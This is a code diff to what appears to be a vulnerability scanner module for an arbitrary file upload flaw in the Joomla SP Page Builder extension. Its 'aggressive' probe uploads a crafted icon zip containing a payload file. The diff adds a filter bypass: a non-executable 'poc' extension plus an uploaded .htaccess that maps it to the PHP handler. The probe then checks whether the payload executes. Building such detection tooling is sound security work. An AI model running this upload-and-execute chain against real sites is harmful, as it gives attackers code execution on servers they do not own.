@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import io
+import json
 import re
 import urllib.parse
 import zipfile
@@ -22,8 +23,12 @@ EXPLOIT_MODES = ["aggressive"]
 AFFECTED_JOOMLA_VERSIONS = ["*"]
 AFFECTED_RULE = "SP Page Builder versions 1.0.0 through 6.6.1"
 FIXED_RULE = "SP Page Builder 6.6.2 or later"
-UPLOAD_ENDPOINT = "/index.php?option=com_sppagebuilder&task=custom_icon.upload"
+UPLOAD_ENDPOINT = "/index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon"
 PUBLIC_ICONFONT_DIR = "/media/com_sppagebuilder/assets/iconfont/"
+# Joomla's InputFilter rejects archives that contain .php names or PHP tags.  The
+# bypass keeps the payload extension non-executable and lets an uploaded
+# .htaccess map it to the PHP handler.
+BYPASS_PAYLOAD_EXTENSION = "poc"
 
 
 def affected_sppagebuilder(version: str | None) -> bool:
@@ -31,14 +36,26 @@ def affected_sppagebuilder(version: str | None) -> bool:
 
 
 def make_icon_zip(package: str, payload_filename: str, payload_content: str, use_htaccess: bool = False) -> bytes:
+    selection = {
+        "IcoMoonType": "selection",
+        "preferences": {
+            "fontPref": {
+                "metadata": {"fontFamily": package},
+                "prefix": "icon-",
+            }
+        },
+    }
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
-        zf.writestr(f"{package}/selection.json", '{"IcoMoonType":"selection"}')
-        zf.writestr(f"{package}/style.css", "/* ProofCMS lab icon package */")
+        zf.writestr(f"{package}/selection.json", json.dumps(selection))
+        zf.writestr(f"{package}/style.css", '.icon-proof:before{content:"\\e900";}')
         zf.writestr(f"{package}/fonts/{package}.ttf", b"\x00\x01\x00\x00")
         zf.writestr(f"{package}/fonts/{payload_filename}", payload_content)
         if use_htaccess:
-            zf.writestr(f"{package}/fonts/.htaccess", "AddType application/x-httpd-php .PHP\n")
+            zf.writestr(
+                f"{package}/fonts/.htaccess",
+                f"AddType application/x-httpd-php .{BYPASS_PAYLOAD_EXTENSION}\n",
+            )
     return buf.getvalue()
 
 
@@ -129,10 +146,15 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
     attempts = [
         ("direct .php", "marker.php", False),
         ("direct .PHP", "marker.PHP", False),
-        (".htaccess+.PHP", "marker.PHP", True),
+        (
+            f".htaccess+.{BYPASS_PAYLOAD_EXTENSION}",
+            f"marker.{BYPASS_PAYLOAD_EXTENSION}",
+            True,
+        ),
     ]
     accepted = []
     proof_notes = []
+    upload_only: Finding | None = None
 
     for method, payload_filename, use_htaccess in attempts:
         zip_name = f"{package}.zip"
@@ -165,8 +187,15 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
                 verify_php_execution(candidate.get("body", ""), expected_product)
             ),
         )
-        if upload.get("status") in (200, 201, 204):
-            accepted.append(f"{method}: upload {upload.get('status')}, proof {proof.get('status') if proof else 0} after {attempts_count} attempt(s)")
+        upload_body = str(upload.get("body", ""))
+        upload_accepted = upload.get("status") in (201, 204) or (
+            upload.get("status") == 200 and '"status":true' in upload_body
+        )
+        if upload_accepted:
+            accepted.append(
+                f"{method}: upload {upload.get('status')}, "
+                f"proof {proof.get('status') if proof else 0} after {attempts_count} attempt(s)"
+            )
         if proof and proof.get("status") == 200 and found_url:
             uploaded_name = url_map.get(found_url, payload_filename)
             body = proof.get("body", "")
@@ -195,7 +224,7 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
                     ),
                 )
             if is_source or "<?php" in body.lower():
-                return Finding(
+                upload_only = Finding(
                     cve=CVE_ID,
                     name=NAME,
                     status="VULNERABLE_UPLOAD_ONLY",
@@ -209,6 +238,9 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
                     detail=f"File write confirmed via {method} (verified in {attempts_count} attempt(s)), but PHP execution was not confirmed (source code served).",
                     action=f"Remove {package} and upgrade SP Page Builder to {FIXED_RULE}.",
                 )
+
+    if upload_only is not None:
+        return upload_only
 
     return Finding(
         cve=CVE_ID,
